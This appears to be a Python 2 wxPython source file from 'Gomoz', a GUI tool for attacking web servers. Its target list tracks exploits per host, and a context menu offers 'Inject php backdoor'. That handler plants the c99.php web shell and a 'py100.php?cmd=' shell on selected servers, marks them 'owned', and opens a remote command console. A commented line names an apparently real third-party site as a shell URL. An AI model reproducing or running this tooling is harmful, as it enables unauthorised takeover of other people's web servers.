import wx
import data, re
import sys, random
import wx.lib.mixins.listctrl
import Gomoz.headers as headers
import gmenubar,gtoolbar, gbrowser, gstatusbar 
import servinfo, Gomoz.injector as injector
import console
import threading
import webbrowser      

class CheckListCtrl(wx.lib.mixins.listctrl.ColumnSorterMixin, threading.Thread):
    def __init__(self, frame, panel, ctrllist):
        threading.Thread.__init__(self)
        self.frame = frame
        self.panel = panel
        self.lc_sources = ctrllist
        self.editable = False
        self.menulogic=False 
        self.il = None
        self.__initialize__()
        self.itemDataMap = {}

            
        if self.editable:
           otherflags |= wx.LC_EDIT_LABELS
                
        self.il = wx.ImageList(16,16, True)

##        a={"sm_up":"GO_UP","sm_dn":"GO_DOWN","w_idx":"WARNING","e_idx":"ERROR","i_idx":"QUESTION"}
##        for k,v in a.items():
##            s="self.%s= self.il.Add(wx.ArtProvider_GetBitmap(wx.ART_%s,wx.ART_TOOLBAR,(16,16)))" % (k,v)
##            t="il_max=self.%s" % k
##            exec(s)
##            exec(t)

        self.sm_up='Gomoz/image/apache.png'
        #self.il.Add(wx.ArtProvider_GetBitmap(wx.ART_GO_UP,wx.ART_TOOLBAR,(16,16)))
        self.sm_dn='Gomoz/image/apache.png'
        #self.il.Add(wx.ArtProvider_GetBitmap(wx.ART_GO_DOWN,wx.ART_TOOLBAR,(16,16)))
            
        #self.frame.lc_sources.SetImageList(self.il, wx.IMAGE_LIST_SMALL)
        
        #for name in glob.glob("image\smicon??.png"):


##
##        lm=['image\\apache.png']
##        for name in lm:
##            bmp = wx.Bitmap(name, wx.BITMAP_TYPE_PNG)
##            il_max = self.il.Add(bmp)
        

        #self.notebook_pane_scan
        #self.frame.lc_sources = wx.ListCtrl(self.panel, -1, style=wx.LC_REPORT|wx.SUNKEN_BORDER)
        self.frame.lc_sources = wx.ListCtrl(self.panel, -1, style=wx.LC_REPORT|wx.SUNKEN_BORDER)
        wx.lib.mixins.listctrl.ColumnSorterMixin.__init__(self,5)
        self.frame.lc_sources.SetBackgroundColour('white')
        self.frame.lc_sources.SetForegroundColour('black')
        self.frame.lc_sources.AssignImageList(self.il, wx.IMAGE_LIST_SMALL)
        columns = ["Request ID", "Target", "Exploit", "Date","Status"]
        for col, text in enumerate(columns):
            self.frame.lc_sources.InsertColumn(col, text)

        
        rows=data.row

        for item in rows:
            index = self.frame.lc_sources.InsertStringItem(sys.maxint, item[0])
            for col, text in enumerate(item[1:]):
                pass
                #self.frame.lc_sources.SetStringItem(index, col+1, text)


             # give each item a random image
##            img = random.randint(0, il_max)
##            self.frame.lc_sources.SetItemImage(index, img, img)
##            self.frame.lc_sources.SetItemData(index, index)
            self.itemDataMap[index] = item
       
        self.frame.lc_sources.SetColumnWidth(0, 80)
        self.frame.lc_sources.SetColumnWidth(1, 170)
        self.frame.lc_sources.SetColumnWidth(2, 320)
        self.frame.lc_sources.SetColumnWidth(3, 120)
        self.frame.lc_sources.SetColumnWidth(4, 70)
         # initialize the column sorter
        #wx.lib.mixins.listctrl.ColumnSorterMixin.__init__(self.frame.lc_sources,len(columns)) 
        
        #self.lc_sources.SetColumnWidth(4, wx.LIST_AUTOSIZE_USEHEADER)
        self.frame.Bind(wx.EVT_LIST_ITEM_SELECTED, self.OnShowMenu, self.lc_sources)
        self.frame.Bind(wx.EVT_LIST_ITEM_DESELECTED, self.OnItemDeselected, self.lc_sources)
        # bind some interesting events
        #self.Bind(wx.EVT_LIST_ITEM_SELECTED, self.OnItemSelected, self.lc_sources)
        #self.Bind(wx.EVT_LIST_ITEM_DESELECTED, self.OnItemDeselected, self.lc_sources)
        #self.frame.Bind(wx.EVT_LIST_ITEM_ACTIVATED, self.OnItemActivated, self.lc_sources)

        # in case we are recreating the list tickle the frame a bit so
        # it will redo the layout
        #self.SendSizeEvent()
            


    def __initialize__(self):
        if self.frame.lc_sources:
           self.frame.lc_sources.Destroy()

    def SetImageServer(self,server):
        pass
        """server='apache'
        if server=='apache':
            name="Gomoz/image/apache.png"
        elif server=='iis':
            name="Gomoz/image/iis.png"
        else:
            name=="Gomoz/image/others.png"
            
        bmp = wx.Bitmap(name, wx.BITMAP_TYPE_PNG)
        il_max = self.il.Add(bmp)
        self.frame.lc_sources.SetImageList(self.il, wx.IMAGE_LIST_SMALL)
        """

    def SetStyle(self,style):
        if self.style is None or self.style == "":
            self.style=wx.LC_REPORT|wx.SUNKEN_BORDER
        else:
            self.style=style

    def add_image(self, image):
        b = wx.BitmapFromImage(image)
        if not b.Ok():
            raise Exception("The image (%s) is not valid." % image)

        if (sys.platform == "darwin" and
            (b.GetWidth(), b.GetHeight()) == (self.icon_size, self.icon_size)):
            return self.il.Add(b)
        
        b2 = wx.EmptyBitmap(self.icon_size, self.icon_size)
        dc = wx.MemoryDC()
        dc.SelectObject(b2)
        dc.SetBackgroundMode(wx.TRANSPARENT)
        dc.Clear()
        x = (b2.GetWidth() - b.GetWidth()) / 2
        y = (b2.GetHeight() - b.GetHeight()) / 2
        dc.DrawBitmap(b, x, y, True)
        dc.SelectObject(wx.NullBitmap)
        b2.SetMask(wx.Mask(b2, (255, 255, 255)))

        return self.il.Add(b2)
    
    def OnItemSelected(self, evt):
        item = evt.GetItem()
        print "Item selected:", item.GetText()
        
    def OnItemDeselected(self, evt):
        item = evt.GetItem()
        print "Item deselected:", item.GetText()

    def OnItemActivated(self, evt): 
        item = evt.GetItem()
        print "Item activated:", item.GetText()

    
    def OnShowMenu(self, event):
        self.enabled = True
        self.menulogic=True
        self.frame.popupmenu = wx.Menu()
        self.frame.startmenu = self.frame.popupmenu.Append(-1, "Restart scan")
        bmp = wx.Bitmap("Gomoz/image/new_scan.png", wx.BITMAP_TYPE_PNG)
        self.frame.startmenu.SetBitmap(bmp)
        
        self.frame.popupmenu.AppendSeparator()
        self.frame.servermenu = self.frame.popupmenu.Append(-1, "View server headers")
        bmp = wx.Bitmap("Gomoz/image/servinfo.png", wx.BITMAP_TYPE_PNG)
        self.frame.servermenu.SetBitmap(bmp)
        
        self.frame.popupmenu.AppendSeparator()
        self.frame.injectmenu = self.frame.popupmenu.Append(-1, "Inject php backdoor")
        bmp = wx.Bitmap("Gomoz/image/inject.png", wx.BITMAP_TYPE_PNG)
        self.frame.injectmenu.SetBitmap(bmp)
        
        self.frame.popupmenu.AppendSeparator()
        self.frame.consolemenu = self.frame.popupmenu.Append(-1, "Console")

        bmp = wx.Bitmap("Gomoz/image/terminal.png", wx.BITMAP_TYPE_PNG)
        self.frame.consolemenu.SetBitmap(bmp)
        
        self.frame.browsemenu = self.frame.popupmenu.Append(-1, "Browse url")
        self.frame.popupmenu.AppendSeparator()
        bmp = wx.Bitmap("Gomoz/image/firefox6.png", wx.BITMAP_TYPE_PNG)
        self.frame.browsemenu.SetBitmap(bmp)
        
        self.frame.deletemenu = self.frame.popupmenu.Append(-1, "Delete")
        bmp = wx.Bitmap("Gomoz/image/remove16.png", wx.BITMAP_TYPE_PNG)
        self.frame.deletemenu.SetBitmap(bmp)

        self.frame.Bind(wx.EVT_MENU, self.OnPopupItemSelected, self.frame.startmenu)
        self.frame.Bind(wx.EVT_MENU, self.OnInjectCmd, self.frame.injectmenu)
        self.frame.Bind(wx.EVT_MENU, self.OnServerInfo, self.frame.servermenu)
        self.frame.Bind(wx.EVT_MENU, self.OnBrowse, self.frame.browsemenu)
        self.frame.Bind(wx.EVT_MENU, self.OnConsole, self.frame.consolemenu)
        self.frame.Bind(wx.EVT_UPDATE_UI, self.OnUpdateSimple, self.frame.consolemenu)        
        self.frame.Bind(wx.EVT_MENU, self.OnRemove, self.frame.deletemenu)

        self.frame.lc_sources.Bind(wx.EVT_CONTEXT_MENU, self.OnShowPopup)




    def OnInjectCmd(self, event):
         tab=[]
         index = self.frame.lc_sources.GetFocusedItem()
         if index ==-1:
             wx.MessageBox("Please select a row(s)!","Delete")
         else :
           index = self.frame.lc_sources.GetFirstSelected()

           dico=self.SetData('~Gomoz/config/gomoz.cfg')
           while index != -1:
                request=self.frame.lc_sources.GetItem(index, 0).GetText()
                server=self.frame.lc_sources.GetItem(index, 1).GetText()
                index = self.frame.lc_sources.GetNextSelected(index)
                result=injector.Injector(server, dico['OPTscan'], 'c99.php', 'py100.php','')
                rs=result.start()
                #if injected
                count=1
                self.frame.tc_url.SetValue("py100.php?cmd=")
                gstatusbar.GomozStatusBar.SetStatusText(self.frame.statusbar, str(count)+ " owned", 1)
                wx.MessageBox("%s is '%s'" % ('server','rs'), 'Info') 
                self.enabled=True
                tab.append([request,server,'rs'])
                print tab
                count += 1

           data=gmenubar.GomozMenuBar.MakeTempData(self.frame.menu)
           for i in range(len(data)):
              self.frame.lc_sources.InsertStringItem(i, str(data[i][0]))
              self.frame.lc_sources.SetStringItem(i, 1, str(data[i][1]))
              self.frame.lc_sources.SetStringItem(i, 2, str(data[i][2]))
              self.frame.lc_sources.SetStringItem(i, 3, str(data[i][3]))
              if  int(data[i][0]) == int(tab[0][0]):
                  self.frame.lc_sources.SetStringItem(i, 4, str(tab[0][2]))
              else:

                  self.frame.lc_sources.SetStringItem(i, 4, str(data[i][4]))
                  


    def SetData(self, path):
        tab={}
        try:
           fs=open(path, 'r')
           while 1:
             txt=fs.readline()
             
             if txt == '':
                break
             if txt[0]!='#': 
                if txt.find('PHPinc') != -1:
                    tab['PHPinc']=txt.split('=')[1].replace('\n','')
                if txt.find('TXTinc') != -1:
                    tab['TXTinc']=txt.split('=')[1].replace('\n','')
                if txt.find('KEYword') != -1:
                    tab['KEYword']=txt.split('=')[1].replace('\n','')
                if txt.find('OPTscan') != -1:
                    tab['OPTscan']=txt.split('=')[1].replace('\n','')
           fs.close()
           return tab
        except:
            pass
        
        
    def OnUpdateSimple(self, event):
        event.Enable(self.enabled)
    
    def OnShowPopup(self, event):
        if self.menulogic==True:
            pos = event.GetPosition()
            pos = self.frame.lc_sources.ScreenToClient(pos)
            self.frame.lc_sources.PopupMenu(self.frame.popupmenu, pos)
        elif self.menulogic==False:
            pass
        
    def OnPopupItemSelected(self, event):
        item = self.frame.popupmenu.FindItemById(event.GetId())
        text = item.GetText()
        wx.MessageBox("You selected item '%s'" % text)

    def OnServerInfo(self, event):
        index = self.frame.lc_sources.GetFocusedItem()
        if index ==-1:
           wx.MessageBox("Please select a row !","Server headers info")
        else:   
            index=gmenubar.GomozMenuBar.GetSelection(self.frame.menu)
            server=self.frame.lc_sources.GetItem(index, 1).GetText()
            try: 
              self.GetServerInfo(server)
            except: 
              wx.MessageBox("Timeout, No info from "+server,"Server headers info")

    def GetServerInfo(self, server):
        
        data=headers.getinfo(server)
        #app=wx.App()
        menu=servinfo.InfoFrame(self.frame, title="Server headers info", size=(400, 320))
        for key, value in data.items():
           menu.SetText(key.capitalize()+' : '+ value+"\n")
        
        menu.Center()
        menu.Show()
        ##app.MainLoop()
        return True



    def SetNameConsole(self, tab, name):
        tab.SetName(name)        


    def OnConsole(self, event):
        # we must create a console stack on onterwin, to handle consoles
        index=gmenubar.GomozMenuBar.GetSelection(self.frame.menu)
        request=self.frame.lc_sources.GetItem(index, 0).GetText()
        consoles=self.frame.lc_sources.GetItem(index, 1).GetText()
        exploit=self.frame.lc_sources.GetItem(index, 2).GetText()
        if consoles is None or consoles =="":
           return

        if request  in self.frame.r_stack:
            print request
            return 
        else:
            self.frame.r_stack.append(request)
            
        self.frame.notebook_console = wx.Panel(self.frame.notebook, -1)

        self.frame.notebook_console.SetAutoLayout(True)
        self.frame.notebook_console.SetBackgroundColour('wx.BLACK')
        self.frame.notebook.AddPage(self.frame.notebook_console, (consoles))
        self.frame.notebook_console.SetForegroundColour(wx.WHITE)
        item = self.frame.notebook_console
            
##        req1 = "self.frame.notebook_console_%s = wx.Panel(self.frame.notebook, -1)" % request
##        exec ("print self.frame.notebook_console_%s % request")
##        req2 = "self.frame.notebook_console_%s.SetAutoLayout(True)" % request
##        req3 = "self.frame.notebook_console_%s.SetBackgroundColour('wx.BLACK')" % request
##        req4 = "self.frame.notebook.AddPage(self.frame.notebook_console_%s, (consoles))" % request
##        req5 = "self.frame.notebook_console_%s.SetForegroundColour(wx.WHITE)" % request
##        req6 = "item = \"self.frame.notebook_console_%s\"" % request
##        for i in range(1,7):
##            t="exec(req%s)" % i
##        exec(t)
        



        self.frame.c_stack[request]=item
        print self.frame.c_stack[request]
        
        #self.frame.c_stack[request].Close()

        test=console.GomozConsole(self.frame.notebook_console, -1, '%')

        url='http://'+str(consoles)+'/'
        print url
        print exploit
        include=self.frame.tc_url.GetValue()
        if include is None or include=='':
            test.SetParams(url, str(exploit), '')
        else:
            test.SetParams(url, str(include), '')
        #test.SetUrl(url='http://iberoriente.net/inj.php?md=')
        #app.MainLoop()
        
        #self.notebook_console.Bind(wx.EVT_CONTEXT_MENU, self.OnShowMenuConsole)        
        #the name of tab, has to be checked
        #self.frame.label=wx.StaticText(self.frame.notebook_console, -1, ("["+console+"]$ _"))
        #self.frame.label.SetFont(wx.Font(8, wx.ROMAN, wx.NORMAL, wx.BOLD))
          

        def OnGetData(self, path, mode):
            try:
                fs=open(path, 'r')
                while 1:
                    txt=fs.readline()
                    if txt == '':
                        break
                    if txt[0]!='#': 
                        if txt.find('PHPinc') != -1 and mode=='.php':
                            return txt.split('=')[1].replace('\n','')
                            
                        if txt.find('TXTinc') != -1 and mode=='.txt':
                            return txt.split('=')[1].replace('\n','')
                            
                        if txt.find('ASPinc') != -1 and mode=='.asp':
                            return txt.split('=')[1].replace('\n','')
                                  
                        if txt.find('JSPinc') != -1 and mode=='.jsp':
                            return txt.split('=')[1].replace('\n','')
                                
                        if txt.find('JPGinc') != -1 and mode=='.jpg':
                            return txt.split('=')[1].replace('\n','')
                                          
                fs.close()
            except:
                pass

    def OnBrowse(self, event):

        index=gmenubar.GomozMenuBar.GetSelection(self.frame.menu)
        browser=self.frame.lc_sources.GetItem(index, 1).GetText()        
        exploit=self.frame.lc_sources.GetItem(index, 2).GetText()
        directory=self.frame.tc_url.GetValue()
        print browser,directory,exploit  
  
        if browser is None or browser =="" or exploit is None or len(str(browser)+str(exploit))>255 :
           print  ("Exception in URL length") 
           browser="localhost"
        try:  
            ext=re.findall("\.\w{3}", exploit)
            if exploit.find(ext)>0:
                rep=self.OnGetData('Gomoz/config/gomoz.cfg', ext)
                replace('[path]', rep)
        except Exception as e:
            print (str(e))
            pass
            
        webbrowser.open("http://"+browser+exploit)
    

        #self.frame.notebook_browser = wx.Panel(self.frame.notebook, -1, size=(200,200))
        #self.frame.notebook_browser.SetBackgroundColour('yellow')
        #self.frame.notebook.AddPage(self.frame.notebook_browser, ("http://"+browser+'/'))
        ##self.panel=wx.Panel(self.frame.notebook_browser, -1, size=(200,200))
        #frm = gbrowser.GomozBrowser(self.frame.notebook_browser)
        ##frm.geturl('http://127.0.0.1:8080/')
        ##frm.Show()
        ##app.MainLoop()

    def OnRemove(self, event):
        gtoolbar.GomozToolBar.OnRemove(self.frame.tool,event)


    def GetListCtrl(self):
        return self.frame.lc_sources

    def GetSortImages(self):
        return (self.sm_dn, self.sm_up)
    
    def OnItemDeselected(self, event):
        self.menulogic=False
        #self.frame.popupmenu.Destroy()

    
    def OnClose(self, event):
           self.Close()
   
    def OnClear(self, event):
           self.frame.lc_sources.DeleteAllItems()

